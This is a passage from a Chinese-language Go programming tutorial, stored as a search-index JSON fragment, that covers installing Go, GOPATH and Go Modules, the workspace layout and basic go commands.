<p>\u5728Mac\u7cfb\u7edf\u4e2d\uff0c\u53ea\u8981\u4f60\u5b89\u88c5\u4e86Xcode\uff0c\u5c31\u5df2\u7ecf\u5305\u542b\u4e86\u76f8\u5e94\u7684\u7f16\u8bd1\u5de5\u5177\u3002</p> <p>\u5728\u7c7bUnix\u7cfb\u7edf\u4e2d\uff0c\u9700\u8981\u5b89\u88c5gcc\u7b49\u5de5\u5177\u3002\u4f8b\u5982Ubuntu\u7cfb\u7edf\u53ef\u901a\u8fc7\u5728\u7ec8\u7aef\u4e2d\u6267\u884c<code>sudo apt-get install gcc libc6-dev</code>\u6765\u5b89\u88c5\u7f16\u8bd1\u5de5\u5177\u3002</p> <p>\u5728 Windows \u7cfb\u7edf\u4e2d\uff0c\u4f60\u9700\u8981\u5b89\u88c5 MinGW\uff0c\u7136\u540e\u901a\u8fc7 MinGW \u5b89\u88c5 gcc\uff0c\u5e76\u8bbe\u7f6e\u76f8\u5e94\u7684\u73af\u5883\u53d8\u91cf\u3002</p> <p>\u4f60\u53ef\u4ee5\u76f4\u63a5\u53bb\u5b98\u7f51\u4e0b\u8f7d\u6e90\u7801\uff0c\u627e\u76f8\u5e94\u7684<code>goVERSION.src.tar.gz</code>\u7684\u6587\u4ef6\u4e0b\u8f7d\uff0c\u4e0b\u8f7d\u4e4b\u540e\u89e3\u538b\u7f29\u5230<code>$HOME</code>\u76ee\u5f55\uff0c\u6267\u884c\u5982\u4e0b\u4ee3\u7801\uff1a</p> <pre><code>cd go/src\n./all.bash\n</code></pre> <p>\u8fd0\u884call.bash\u540e\u51fa\u73b0\"ALL TESTS PASSED\"\u5b57\u6837\u65f6\u624d\u7b97\u5b89\u88c5\u6210\u529f\u3002</p> <p>\u4e0a\u9762\u662fUnix\u98ce\u683c\u7684\u547d\u4ee4\uff0cWindows\u4e0b\u7684\u5b89\u88c5\u65b9\u5f0f\u7c7b\u4f3c\uff0c\u53ea\u4e0d\u8fc7\u662f\u8fd0\u884c<code>all.bat</code>\uff0c\u8c03\u7528\u7684\u7f16\u8bd1\u5668\u662fMinGW\u7684gcc\u3002</p> <p>\u5982\u679c\u662fMac\u6216\u8005Unix\u7528\u6237\u9700\u8981\u8bbe\u7f6e\u51e0\u4e2a\u73af\u5883\u53d8\u91cf\uff0c\u5982\u679c\u60f3\u91cd\u542f\u4e4b\u540e\u4e5f\u80fd\u751f\u6548\u7684\u8bdd\u628a\u4e0b\u9762\u7684\u547d\u4ee4\u5199\u5230<code>.bashrc</code>\u6216\u8005<code>.zshrc</code>\u91cc\u9762\uff0c</p> <pre><code>export GOPATH=$HOME/gopath\nexport PATH=$PATH:$HOME/go/bin:$GOPATH/bin\n</code></pre> <p>\u5982\u679c\u4f60\u662f\u5199\u5165\u6587\u4ef6\u7684\uff0c\u8bb0\u5f97\u6267\u884c<code>bash .bashrc</code>\u6216\u8005<code>bash .zshrc</code>\u4f7f\u5f97\u8bbe\u7f6e\u7acb\u9a6c\u751f\u6548\u3002</p> <p>\u5982\u679c\u662fwindow\u7cfb\u7edf\uff0c\u5c31\u9700\u8981\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\uff0c\u5728path\u91cc\u9762\u589e\u52a0\u76f8\u5e94\u7684go\u6240\u5728\u7684\u76ee\u5f55\uff0c\u8bbe\u7f6egopath\u53d8\u91cf\u3002</p> <p>\u5f53\u4f60\u8bbe\u7f6e\u5b8c\u6bd5\u4e4b\u540e\u5728\u547d\u4ee4\u884c\u91cc\u9762\u8f93\u5165<code>go</code>\uff0c\u770b\u5230\u5982\u4e0b\u56fe\u7247\u5373\u8bf4\u660e\u4f60\u5df2\u7ecf\u5b89\u88c5\u6210\u529f</p> <p></p> <p>\u56fe1.1 \u6e90\u7801\u5b89\u88c5\u4e4b\u540e\u6267\u884cGo\u547d\u4ee4\u7684\u56fe</p> <p>\u5982\u679c\u51fa\u73b0Go\u7684Usage\u4fe1\u606f\uff0c\u90a3\u4e48\u8bf4\u660eGo\u5df2\u7ecf\u5b89\u88c5\u6210\u529f\u4e86\uff1b\u5982\u679c\u51fa\u73b0\u8be5\u547d\u4ee4\u4e0d\u5b58\u5728\uff0c\u90a3\u4e48\u53ef\u4ee5\u68c0\u67e5\u4e00\u4e0b\u81ea\u5df1\u7684PATH\u73af\u5883\u53d8\u4e2d\u662f\u5426\u5305\u542b\u4e86Go\u7684\u5b89\u88c5\u76ee\u5f55\u3002</p> <p>\u4ecego 1.8\u5f00\u59cb\uff0cGOPATH \u73af\u5883\u53d8\u91cf\u73b0\u5728\u6709\u4e00\u4e2a\u9ed8\u8ba4\u503c\uff0c\u5982\u679c\u5b83\u6ca1\u6709\u88ab\u8bbe\u7f6e\u3002 \u5b83\u5728Unix\u4e0a\u9ed8\u8ba4\u4e3a$HOME/go,\u5728Windows\u4e0a\u9ed8\u8ba4\u4e3a%USERPROFILE%/go\u3002 \u4ece Go1.11 \u5f00\u59cb, Go \u5b98\u65b9\u52a0\u5165\u4e86 Go Module \u652f\u6301.</p> <p>\u5173\u4e8e\u4e0a\u9762\u7684 GO Module \u548c GOPATH \u5c06\u5728\u4e0b\u9762\u5c0f\u8282\u8be6\u7ec6\u8bb2\u89e3</p>"},{"location":"01.1/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: Go\u73af\u5883\u914d\u7f6e</li> <li>\u4e0b\u4e00\u8282: Go Module, GOPATH \u4e0e\u5de5\u4f5c\u7a7a\u95f4</li> </ul>"},{"location":"01.2/","title":"1.2 Go Module, GOPATH \u4e0e\u5de5\u4f5c\u7a7a\u95f4","text":"<p>\u4ece Go1.11 \u5f00\u59cb, Go \u5b98\u65b9\u52a0\u5165 Go Module \u652f\u6301, Go1.12 \u6210\u4e3a\u9ed8\u8ba4\u652f\u6301; \u4ece\u6b64\u544a\u522b\u6e90\u7801\u5fc5\u987b\u653e\u5728 Gopath \u4e2d  \u4ee5\u53ca Gopath \u5bf9\u521d\u5b66\u8005\u9020\u6210\u7684\u56f0\u6270.</p>"},{"location":"01.2/#go-module","title":"\u4f7f\u7528 Go Module","text":"<p>\u7531\u4e8e\u4f17\u6240\u5468\u77e5\u7684\u539f\u56e0, \u8981\u987a\u5229\u5b89\u88c5 Go Module \u7684\u5305, \u9700\u8981\u5148\u8bbe\u7f6e\u4ee3\u7406:</p> <p>\u516c\u5171\u6a21\u5757\u4ee3\u7406: <pre><code>export GOPROXY=https://goproxy.io  // \u4e5f\u53ef\u4ee5\u8bbe\u7f6e\u4e3a https://goproxy.cn \u6216\u8005\u5176\u4ed6\n</code></pre></p> <p>\u79c1\u6709\u6a21\u5757\u4ee3\u7406: <pre><code>export GOPRIVATE=git.xxx.com\n</code></pre></p> <p>\u521d\u59cb\u5316: <pre><code>go mod init [module \u540d\u79f0]\n</code></pre></p> <p>\u68c0\u6d4b\u548c\u6e05\u7406\u4f9d\u8d56: <pre><code>go mod tidy\n</code></pre></p> <p>\u5b89\u88c5\u6307\u5b9a\u5305: <pre><code>go get -v github.com/go-ego/gse@v0.60.0-rc4.2\n</code></pre></p>"},{"location":"01.2/#_1","title":"\u66f4\u65b0\u4f9d\u8d56","text":"<p><pre><code>go get -u\n</code></pre> \u66f4\u65b0\u6307\u5b9a\u5305\u4f9d\u8d56: <pre><code>go get -u github.com/go-ego/gse\n</code></pre> \u6307\u5b9a\u7248\u672c: <pre><code>go get -u github/com/go-ego/gse@v0.60.0-rc4.2\n</code></pre></p>"},{"location":"01.2/#replace","title":"Replace:","text":"<p>\u4f7f\u7528\u547d\u4ee4\u884c: <pre><code>go mod edit -replace github.com/go-ego/gse=/path/to/local/gse\ngo mod edit -replace github.com/go-ego/gse=github.com/vcaesar/gse\n</code></pre> \u4e5f\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u6a21\u5757\u6587\u4ef6:</p> <pre><code>replace github.com/go-ego/gse =&gt; github.com/vcaesar/gse\n</code></pre>"},{"location":"01.2/#gomodule","title":"GOMODULE \u5e38\u7528\u547d\u4ee4:","text":"<pre><code>go mod init  # \u521d\u59cb\u5316 go.mod\ngo mod tidy  # \u66f4\u65b0\u4f9d\u8d56\u6587\u4ef6\ngo mod download  # \u4e0b\u8f7d\u4f9d\u8d56\u6587\u4ef6\n\ngo mod vendor  # \u5c06\u4f9d\u8d56\u8f6c\u79fb\u81f3\u672c\u5730\u7684 vendor \u6587\u4ef6\ngo mod edit  # \u624b\u52a8\u4fee\u6539\u4f9d\u8d56\u6587\u4ef6\ngo mod graph  # \u6253\u5370\u4f9d\u8d56\u56fe\ngo mod verify  # \u6821\u9a8c\u4f9d\u8d56\n</code></pre> <p>\u524d\u9762\u6211\u4eec\u5728\u5b89\u88c5 Go \u7684\u65f6\u5019\u770b\u5230\u9700\u8981\u8bbe\u7f6e GOPATH \u53d8\u91cf\uff0cGo \u4ece1.1\u7248\u672c\u52301.7\u5fc5\u987b\u8bbe\u7f6e\u8fd9\u4e2a\u53d8\u91cf\uff0c\u800c\u4e14\u4e0d\u80fd\u548cGo\u7684\u5b89\u88c5\u76ee\u5f55\u4e00\u6837\uff0c\u8fd9\u4e2a\u76ee\u5f55\u7528\u6765\u5b58\u653eGo\u6e90\u7801\uff0cGo\u7684\u53ef\u8fd0\u884c\u6587\u4ef6\uff0c\u4ee5\u53ca\u76f8\u5e94\u7684\u7f16\u8bd1\u4e4b\u540e\u7684\u5305\u6587\u4ef6\u3002\u6240\u4ee5\u8fd9\u4e2a\u76ee\u5f55\u4e0b\u9762\u6709\u4e09\u4e2a\u5b50\u76ee\u5f55\uff1asrc\u3001bin\u3001pkg</p> <p>\u4ecego 1.8\u5f00\u59cb\uff0cGOPATH \u73af\u5883\u53d8\u91cf\u73b0\u5728\u6709\u4e00\u4e2a\u9ed8\u8ba4\u503c\uff0c\u5982\u679c\u5b83\u6ca1\u6709\u88ab\u8bbe\u7f6e\u3002 \u5b83\u5728Unix\u4e0a\u9ed8\u8ba4\u4e3a$HOME/go,\u5728Windows\u4e0a\u9ed8\u8ba4\u4e3a%USERPROFILE%/go\u3002</p>"},{"location":"01.2/#gopath","title":"GOPATH\u8bbe\u7f6e","text":"<p>go \u547d\u4ee4\u4f9d\u8d56\u4e00\u4e2a\u91cd\u8981\u7684\u73af\u5883\u53d8\u91cf\uff1a$GOPATH</p> <p>Windows\u7cfb\u7edf\u4e2d\u73af\u5883\u53d8\u91cf\u7684\u5f62\u5f0f\u4e3a<code>%GOPATH%</code>\uff0c\u672c\u4e66\u4e3b\u8981\u4f7f\u7528Unix\u5f62\u5f0f\uff0cWindows\u7528\u6237\u8bf7\u81ea\u884c\u66ff\u6362\u3002</p> <p>\uff08\u6ce8\uff1a\u8fd9\u4e2a\u4e0d\u662fGo\u5b89\u88c5\u76ee\u5f55\u3002\u4e0b\u9762\u4ee5\u7b14\u8005\u7684\u5de5\u4f5c\u76ee\u5f55\u4e3a\u793a\u4f8b\uff0c\u5982\u679c\u4f60\u60f3\u4e0d\u4e00\u6837\u8bf7\u628aGOPATH\u66ff\u6362\u6210\u4f60\u7684\u5de5\u4f5c\u76ee\u5f55\u3002\uff09</p> <p>\u5728\u7c7b Unix \u73af\u5883\u4e0b\u5927\u6982\u8fd9\u6837\u8bbe\u7f6e\uff1a <pre><code>export GOPATH=/home/apple/mygo\n</code></pre></p> <p>\u4e3a\u4e86\u65b9\u4fbf\uff0c\u5e94\u8be5\u65b0\u5efa\u4ee5\u4e0a\u6587\u4ef6\u5939\uff0c\u5e76\u4e14\u4e0a\u4e00\u884c\u52a0\u5165\u5230 <code>.bashrc</code> \u6216\u8005 <code>.zshrc</code> \u6216\u8005\u81ea\u5df1\u7684 <code>sh</code> \u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\u3002</p> <p>Windows \u8bbe\u7f6e\u5982\u4e0b\uff0c\u65b0\u5efa\u4e00\u4e2a\u73af\u5883\u53d8\u91cf\u540d\u79f0\u53eb\u505aGOPATH\uff1a <pre><code>GOPATH=c:\\mygo\n</code></pre> GOPATH\u5141\u8bb8\u591a\u4e2a\u76ee\u5f55\uff0c\u5f53\u6709\u591a\u4e2a\u76ee\u5f55\u65f6\uff0c\u8bf7\u6ce8\u610f\u5206\u9694\u7b26\uff0c\u591a\u4e2a\u76ee\u5f55\u7684\u65f6\u5019Windows\u662f\u5206\u53f7\uff0cLinux\u7cfb\u7edf\u662f\u5192\u53f7\uff0c\u5f53\u6709\u591a\u4e2aGOPATH\u65f6\uff0c\u9ed8\u8ba4\u4f1a\u5c06go get\u7684\u5185\u5bb9\u653e\u5728\u7b2c\u4e00\u4e2a\u76ee\u5f55\u4e0b\u3002</p> <p>\u4ee5\u4e0a $GOPATH \u76ee\u5f55\u7ea6\u5b9a\u6709\u4e09\u4e2a\u5b50\u76ee\u5f55\uff1a</p> <ul> <li>src \u5b58\u653e\u6e90\u4ee3\u7801\uff08\u6bd4\u5982\uff1a.go .c .h .s\u7b49\uff09</li> <li>pkg \u7f16\u8bd1\u540e\u751f\u6210\u7684\u6587\u4ef6\uff08\u6bd4\u5982\uff1a.a\uff09</li> <li>bin \u7f16\u8bd1\u540e\u751f\u6210\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff08\u4e3a\u4e86\u65b9\u4fbf\uff0c\u53ef\u4ee5\u628a\u6b64\u76ee\u5f55\u52a0\u5165\u5230 $PATH \u53d8\u91cf\u4e2d\uff0c\u5982\u679c\u6709\u591a\u4e2agopath\uff0c\u90a3\u4e48\u4f7f\u7528<code>${GOPATH//://bin:}/bin</code>\u6dfb\u52a0\u6240\u6709\u7684bin\u76ee\u5f55\uff09</li> </ul> <p>\u4ee5\u540e\u6211\u6240\u6709\u7684\u4f8b\u5b50\u90fd\u662f\u4ee5mygo\u4f5c\u4e3a\u6211\u7684gopath\u76ee\u5f55</p>"},{"location":"01.2/#_2","title":"\u4ee3\u7801\u76ee\u5f55\u7ed3\u6784\u89c4\u5212","text":"<p>GOPATH\u4e0b\u7684src\u76ee\u5f55\u5c31\u662f\u63a5\u4e0b\u6765\u5f00\u53d1\u7a0b\u5e8f\u7684\u4e3b\u8981\u76ee\u5f55\uff0c\u6240\u6709\u7684\u6e90\u7801\u90fd\u662f\u653e\u5728\u8fd9\u4e2a\u76ee\u5f55\u4e0b\u9762\uff0c\u90a3\u4e48\u4e00\u822c\u6211\u4eec\u7684\u505a\u6cd5\u5c31\u662f\u4e00\u4e2a\u76ee\u5f55\u4e00\u4e2a\u9879\u76ee\uff0c\u4f8b\u5982: $GOPATH/src/mymath \u8868\u793amymath\u8fd9\u4e2a\u5e94\u7528\u5305\u6216\u8005\u53ef\u6267\u884c\u5e94\u7528\uff0c\u8fd9\u4e2a\u6839\u636epackage\u662fmain\u8fd8\u662f\u5176\u4ed6\u6765\u51b3\u5b9a\uff0cmain\u7684\u8bdd\u5c31\u662f\u53ef\u6267\u884c\u5e94\u7528\uff0c\u5176\u4ed6\u7684\u8bdd\u5c31\u662f\u5e94\u7528\u5305\uff0c\u8fd9\u4e2a\u4f1a\u5728\u540e\u7eed\u8be6\u7ec6\u4ecb\u7ecdpackage\u3002</p> <p>\u6240\u4ee5\u5f53\u65b0\u5efa\u5e94\u7528\u6216\u8005\u4e00\u4e2a\u4ee3\u7801\u5305\u65f6\u90fd\u662f\u5728src\u76ee\u5f55\u4e0b\u65b0\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u6587\u4ef6\u5939\u540d\u79f0\u4e00\u822c\u662f\u4ee3\u7801\u5305\u540d\u79f0\uff0c\u5f53\u7136\u4e5f\u5141\u8bb8\u591a\u7ea7\u76ee\u5f55\uff0c\u4f8b\u5982\u5728src\u4e0b\u9762\u65b0\u5efa\u4e86\u76ee\u5f55$GOPATH/src/github.com/astaxie/beedb \u90a3\u4e48\u8fd9\u4e2a\u5305\u8def\u5f84\u5c31\u662f\"github.com/astaxie/beedb\"\uff0c\u5305\u540d\u79f0\u662f\u6700\u540e\u4e00\u4e2a\u76ee\u5f55beedb</p> <p>\u4e0b\u9762\u6211\u5c31\u4ee5mymath\u4e3a\u4f8b\u6765\u8bb2\u8ff0\u5982\u4f55\u7f16\u5199\u5e94\u7528\u5305\uff0c\u6267\u884c\u5982\u4e0b\u4ee3\u7801 <pre><code>cd $GOPATH/src\nmkdir mymath\n</code></pre></p> <p>\u65b0\u5efa\u6587\u4ef6sqrt.go\uff0c\u5185\u5bb9\u5982\u4e0b <pre><code>// $GOPATH/src/mymath/sqrt.go\u6e90\u7801\u5982\u4e0b\uff1a\npackage mymath\n\nfunc Sqrt(x float64) float64 {\nz := 0.0\nfor i := 0; i &lt; 1000; i++ {\nz -= (z*z - x) / (2 * x)\n}\nreturn z\n}\n</code></pre> \u8fd9\u6837\u6211\u7684\u5e94\u7528\u5305\u76ee\u5f55\u548c\u4ee3\u7801\u5df2\u7ecf\u65b0\u5efa\u5b8c\u6bd5\uff0c\u6ce8\u610f\uff1a\u4e00\u822c\u5efa\u8baepackage\u7684\u540d\u79f0\u548c\u76ee\u5f55\u540d\u4fdd\u6301\u4e00\u81f4</p>"},{"location":"01.2/#_3","title":"\u7f16\u8bd1\u5e94\u7528","text":"<p>\u4e0a\u9762\u6211\u4eec\u5df2\u7ecf\u5efa\u7acb\u4e86\u81ea\u5df1\u7684\u5e94\u7528\u5305\uff0c\u5982\u4f55\u8fdb\u884c\u7f16\u8bd1\u5b89\u88c5\u5462\uff1f\u6709\u4e24\u79cd\u65b9\u5f0f\u53ef\u4ee5\u8fdb\u884c\u5b89\u88c5</p> <p>1\u3001\u53ea\u8981\u8fdb\u5165\u5bf9\u5e94\u7684\u5e94\u7528\u5305\u76ee\u5f55\uff0c\u7136\u540e\u6267\u884c<code>go install</code>\uff0c\u5c31\u53ef\u4ee5\u5b89\u88c5\u4e86</p> <p>2\u3001\u5728\u4efb\u610f\u7684\u76ee\u5f55\u6267\u884c\u5982\u4e0b\u4ee3\u7801<code>go install mymath</code></p> <p>\u5b89\u88c5\u5b8c\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u8fdb\u5165\u5982\u4e0b\u76ee\u5f55 <pre><code>cd $GOPATH/pkg/${GOOS}_${GOARCH}\n//\u53ef\u4ee5\u770b\u5230\u5982\u4e0b\u6587\u4ef6\nmymath.a\n</code></pre> \u8fd9\u4e2a.a\u6587\u4ef6\u662f\u5e94\u7528\u5305\uff0c\u90a3\u4e48\u6211\u4eec\u5982\u4f55\u8fdb\u884c\u8c03\u7528\u5462\uff1f</p> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u65b0\u5efa\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u6765\u8c03\u7528\u8fd9\u4e2a\u5e94\u7528\u5305</p> <p>\u65b0\u5efa\u5e94\u7528\u5305mathapp <pre><code>cd $GOPATH/src\nmkdir mathapp\ncd mathapp\nvim main.go\n</code></pre></p> <p><code>$GOPATH/src/mathapp/main.go</code>\u6e90\u7801\uff1a <pre><code>package main\n\nimport (\n\"mymath\"\n\"fmt\"\n)\n\nfunc main() {\nfmt.Printf(\"Hello, world.  Sqrt(2) = %v\\n\", mymath.Sqrt(2))\n}\n</code></pre></p> <p>\u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a\u7684package\u662f<code>main</code>\uff0cimport\u91cc\u9762\u8c03\u7528\u7684\u5305\u662f<code>mymath</code>,\u8fd9\u4e2a\u5c31\u662f\u76f8\u5bf9\u4e8e<code>$GOPATH/src</code>\u7684\u8def\u5f84\uff0c\u5982\u679c\u662f\u591a\u7ea7\u76ee\u5f55\uff0c\u5c31\u5728import\u91cc\u9762\u5f15\u5165\u591a\u7ea7\u76ee\u5f55\uff0c\u5982\u679c\u4f60\u6709\u591a\u4e2aGOPATH\uff0c\u4e5f\u662f\u4e00\u6837\uff0cGo\u4f1a\u81ea\u52a8\u5728\u591a\u4e2a<code>$GOPATH/src</code>\u4e2d\u5bfb\u627e\u3002</p> <p>\u5982\u4f55\u7f16\u8bd1\u7a0b\u5e8f\u5462\uff1f\u8fdb\u5165\u8be5\u5e94\u7528\u76ee\u5f55\uff0c\u7136\u540e\u6267\u884c<code>go build</code>\uff0c\u90a3\u4e48\u5728\u8be5\u76ee\u5f55\u4e0b\u9762\u4f1a\u751f\u6210\u4e00\u4e2amathapp\u7684\u53ef\u6267\u884c\u6587\u4ef6 <pre><code>./mathapp\n</code></pre></p> <p>\u8f93\u51fa\u5982\u4e0b\u5185\u5bb9 <pre><code>Hello, world.  Sqrt(2) = 1.414213562373095\n</code></pre></p> <p>\u5982\u4f55\u5b89\u88c5\u8be5\u5e94\u7528\uff0c\u8fdb\u5165\u8be5\u76ee\u5f55\u6267\u884c<code>go install</code>,\u90a3\u4e48\u5728$GOPATH/bin/\u4e0b\u589e\u52a0\u4e86\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6mathapp, \u8fd8\u8bb0\u5f97\u524d\u9762\u6211\u4eec\u628a<code>$GOPATH/bin</code>\u52a0\u5230\u6211\u4eec\u7684PATH\u91cc\u9762\u4e86\uff0c\u8fd9\u6837\u53ef\u4ee5\u5728\u547d\u4ee4\u884c\u8f93\u5165\u5982\u4e0b\u547d\u4ee4\u5c31\u53ef\u4ee5\u6267\u884c</p> <pre><code>mathapp\n</code></pre> <p>\u4e5f\u662f\u8f93\u51fa\u5982\u4e0b\u5185\u5bb9</p> <pre><code>Hello, world.  Sqrt(2) = 1.414213562373095\n</code></pre> <p>\u8fd9\u91cc\u6211\u4eec\u5c55\u793a\u5982\u4f55\u7f16\u8bd1\u548c\u5b89\u88c5\u4e00\u4e2a\u53ef\u8fd0\u884c\u7684\u5e94\u7528\uff0c\u4ee5\u53ca\u5982\u4f55\u8bbe\u8ba1\u6211\u4eec\u7684\u76ee\u5f55\u7ed3\u6784\u3002</p> <p>\u5bf9\u4e8e\u542f\u7528go module\u7684Go\u7248\u672c\uff0c\u9700\u8981\u5bf9mod.go\u8fdb\u884c\u914d\u7f6e\u3002\uff08\u4f7f\u7528replace\u7684\u65b9\u5f0f\u5c06\u8fdc\u7a0b\u5305\u66ff\u6362\u4e3a\u672c\u5730\u5305\uff09</p>"},{"location":"01.2/#_4","title":"\u83b7\u53d6\u8fdc\u7a0b\u5305","text":"<p>go\u8bed\u8a00\u6709\u4e00\u4e2a\u83b7\u53d6\u8fdc\u7a0b\u5305\u7684\u5de5\u5177\u5c31\u662f<code>go get</code>\uff0c\u76ee\u524dgo get\u652f\u6301\u591a\u6570\u5f00\u6e90\u793e\u533a(\u4f8b\u5982\uff1aGitHub\u3001googlecode\u3001bitbucket\u3001Launchpad)</p> <pre><code>go get github.com/astaxie/beedb\n</code></pre> <p>go get -u \u53c2\u6570\u53ef\u4ee5\u81ea\u52a8\u66f4\u65b0\u5305\uff0c\u800c\u4e14\u5f53go get\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u83b7\u53d6\u8be5\u5305\u4f9d\u8d56\u7684\u5176\u4ed6\u7b2c\u4e09\u65b9\u5305   </p> <p>\u901a\u8fc7\u8fd9\u4e2a\u547d\u4ee4\u53ef\u4ee5\u83b7\u53d6\u76f8\u5e94\u7684\u6e90\u7801\uff0c\u5bf9\u5e94\u7684\u5f00\u6e90\u5e73\u53f0\u91c7\u7528\u4e0d\u540c\u7684\u6e90\u7801\u63a7\u5236\u5de5\u5177\uff0c\u4f8b\u5982GitHub\u91c7\u7528git\u3001googlecode\u91c7\u7528hg\uff0c\u6240\u4ee5\u8981\u60f3\u83b7\u53d6\u8fd9\u4e9b\u6e90\u7801\uff0c\u5fc5\u987b\u5148\u5b89\u88c5\u76f8\u5e94\u7684\u6e90\u7801\u63a7\u5236\u5de5\u5177</p> <p>\u901a\u8fc7\u4e0a\u9762\u83b7\u53d6\u7684\u4ee3\u7801\u5728\u6211\u4eec\u672c\u5730\u7684\u6e90\u7801\u76f8\u5e94\u7684\u4ee3\u7801\u7ed3\u6784\u5982\u4e0b</p> <pre><code>$GOPATH\n  src\n   |--github.com\n          |-astaxie\n              |-beedb\n   pkg\n    |--\u76f8\u5e94\u5e73\u53f0\n         |-github.com\n               |--astaxie\n                    |beedb.a\n</code></pre> <p>go get\u672c\u8d28\u4e0a\u53ef\u4ee5\u7406\u89e3\u4e3a\u9996\u5148\u7b2c\u4e00\u6b65\u662f\u901a\u8fc7\u6e90\u7801\u5de5\u5177clone\u4ee3\u7801\u5230src\u4e0b\u9762\uff0c\u7136\u540e\u6267\u884c<code>go install</code></p> <p>\u5728\u4ee3\u7801\u4e2d\u5982\u4f55\u4f7f\u7528\u8fdc\u7a0b\u5305\uff0c\u5f88\u7b80\u5355\u7684\u5c31\u662f\u548c\u4f7f\u7528\u672c\u5730\u5305\u4e00\u6837\uff0c\u53ea\u8981\u5728\u5f00\u5934import\u76f8\u5e94\u7684\u8def\u5f84\u5c31\u53ef\u4ee5</p> <pre><code>import \"github.com/astaxie/beedb\"\n</code></pre>"},{"location":"01.2/#_5","title":"\u7a0b\u5e8f\u7684\u6574\u4f53\u7ed3\u6784","text":"<p>\u901a\u8fc7\u4e0a\u9762\u5efa\u7acb\u7684\u6211\u672c\u5730\u7684mygo\u7684\u76ee\u5f55\u7ed3\u6784\u5982\u4e0b\u6240\u793a</p> <pre><code>bin/\n    mathapp\npkg/\n    \u5e73\u53f0\u540d/ \u5982\uff1adarwin_amd64\u3001linux_amd64\n         mymath.a\n         github.com/\n              astaxie/\n                   beedb.a\nsrc/\n    mathapp\n          main.go\n    mymath/\n          sqrt.go\n    github.com/\n           astaxie/\n                beedb/\n                    beedb.go\n                    util.go\n</code></pre> <p>\u4ece\u4e0a\u9762\u7684\u7ed3\u6784\u6211\u4eec\u53ef\u4ee5\u5f88\u6e05\u6670\u7684\u770b\u5230\uff0cbin\u76ee\u5f55\u4e0b\u9762\u5b58\u7684\u662f\u7f16\u8bd1\u4e4b\u540e\u53ef\u6267\u884c\u7684\u6587\u4ef6\uff0cpkg\u4e0b\u9762\u5b58\u653e\u7684\u662f\u5e94\u7528\u5305\uff0csrc\u4e0b\u9762\u4fdd\u5b58\u7684\u662f\u5e94\u7528\u6e90\u4ee3\u7801</p>"},{"location":"01.2/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u5b89\u88c5Go</li> <li>\u4e0b\u4e00\u8282: GO \u547d\u4ee4</li> </ul>"},{"location":"01.3/","title":"1.3 Go \u547d\u4ee4","text":""},{"location":"01.3/#go","title":"Go \u547d\u4ee4","text":"<p>Go\u8bed\u8a00\u81ea\u5e26\u6709\u4e00\u5957\u5b8c\u6574\u7684\u547d\u4ee4\u64cd\u4f5c\u5de5\u5177\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u5728\u547d\u4ee4\u884c\u4e2d\u6267\u884c<code>go</code>\u6765\u67e5\u770b\u5b83\u4eec\uff1a</p> <p></p> <p>\u56fe1.3 Go\u547d\u4ee4\u663e\u793a\u8be6\u7ec6\u7684\u4fe1\u606f</p> <p>\u8fd9\u4e9b\u547d\u4ee4\u5bf9\u4e8e\u6211\u4eec\u5e73\u65f6\u7f16\u5199\u7684\u4ee3\u7801\u975e\u5e38\u6709\u7528\uff0c\u63a5\u4e0b\u6765\u5c31\u8ba9\u6211\u4eec\u4e86\u89e3\u4e00\u4e9b\u5e38\u7528\u7684\u547d\u4ee4\u3002</p>"},{"location":"01.3/#go-build","title":"go build","text":"<p>\u8fd9\u4e2a\u547d\u4ee4\u4e3b\u8981\u7528\u4e8e\u7f16\u8bd1\u4ee3\u7801\u3002\u5728\u5305\u7684\u7f16\u8bd1\u8fc7\u7a0b\u4e2d\uff0c\u82e5\u6709\u5fc5\u8981\uff0c\u4f1a\u540c\u65f6\u7f16\u8bd1\u4e0e\u4e4b\u76f8\u5173\u8054\u7684\u5305\u3002</p> <ul> <li> <p>\u5982\u679c\u662f\u666e\u901a\u5305\uff0c\u5c31\u50cf\u6211\u4eec\u57281.2\u8282\u4e2d\u7f16\u5199\u7684<code>mymath</code>\u5305\u90a3\u6837\uff0c\u5f53\u4f60\u6267\u884c<code>go build</code>\u4e4b\u540e\uff0c\u5b83\u4e0d\u4f1a\u4ea7\u751f\u4efb\u4f55\u6587\u4ef6\u3002\u5982\u679c\u4f60\u9700\u8981\u5728<code>$GOPATH/pkg</code>\u4e0b\u751f\u6210\u76f8\u5e94\u7684\u6587\u4ef6\uff0c\u90a3\u5c31\u5f97\u6267\u884c<code>go install</code>\u3002</p> </li> <li> <p>\u5982\u679c\u662f<code>main</code>\u5305\uff0c\u5f53\u4f60\u6267\u884c<code>go build</code>\u4e4b\u540e\uff0c\u5b83\u5c31\u4f1a\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u751f\u6210\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u3002\u5982\u679c\u4f60\u9700\u8981\u5728<code>$GOPATH/bin</code>\u4e0b\u751f\u6210\u76f8\u5e94\u7684\u6587\u4ef6\uff0c\u9700\u8981\u6267\u884c<code>go install</code>\uff0c\u6216\u8005\u4f7f\u7528<code>go build -o \u8def\u5f84/a.exe</code>\u3002</p> </li> <li> <p>\u5982\u679c\u67d0\u4e2a\u9879\u76ee\u6587\u4ef6\u5939\u4e0b\u6709\u591a\u4e2a\u6587\u4ef6\uff0c\u800c\u4f60\u53ea\u60f3\u7f16\u8bd1\u67d0\u4e2a\u6587\u4ef6\uff0c\u5c31\u53ef\u5728<code>go build</code>\u4e4b\u540e\u52a0\u4e0a\u6587\u4ef6\u540d\uff0c\u4f8b\u5982<code>go build a.go</code>\uff1b<code>go 